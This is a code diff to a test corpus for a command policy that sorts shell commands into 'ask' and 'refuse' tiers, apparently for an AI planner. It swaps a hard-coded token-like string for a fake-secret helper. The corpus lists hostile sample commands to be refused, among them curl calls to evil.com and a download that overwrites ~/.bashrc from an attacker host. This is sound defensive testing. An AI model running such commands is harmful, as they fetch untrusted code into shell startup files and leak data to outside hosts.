@@ -38,6 +38,7 @@
 
 import { DEFAULT_PLANNER_ALLOWLIST } from '../../plannerAllowlist';
 import type { CommandTier } from '../../commandPolicy';
+import { fakeSecret } from '../fakeSecret';
 
 export type CorpusDialect = 'posix' | 'cmd';
 
@@ -1048,7 +1049,7 @@ const WEB_COMMAND_REGRESSIONS: CorpusEntry[] = [
   { command: 'wget --spider --max-redirect=0 https://docs.example/variant', tier: 'ask', scope: 'wget https://docs.example/*' },
   { command: 'timeout 5 curl https://docs.example/a http://api.example/b | head -1', tier: 'ask', scope: 'curl http://api.example/* + curl https://docs.example/*' },
   { command: 'wget --spider --max-redirect=0 https://docs.example/held-provider-secret', tier: 'ask', scope: 'wget https://docs.example/*' },
-  { command: 'curl https://docs.example/ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', tier: 'ask', scope: 'curl https://docs.example/*' },
+  { command: `curl https://docs.example/${fakeSecret('github')}`, tier: 'ask', scope: 'curl https://docs.example/*' },
   { command: 'curl -s https://docs.x.com/defaults', tier: 'ask', scope: 'curl https://docs.x.com/*', allow: [...DEFAULT_PLANNER_ALLOWLIST, 'curl https://docs.x.com/*'], allowedBy: 'curl https://docs.x.com/*' },
   { command: '/usr/bin/curl https://evil.com/a', tier: 'refuse' },
   { command: 'curl.exe -K x -o ~/.bashrc https://evil.example', tier: 'refuse' },
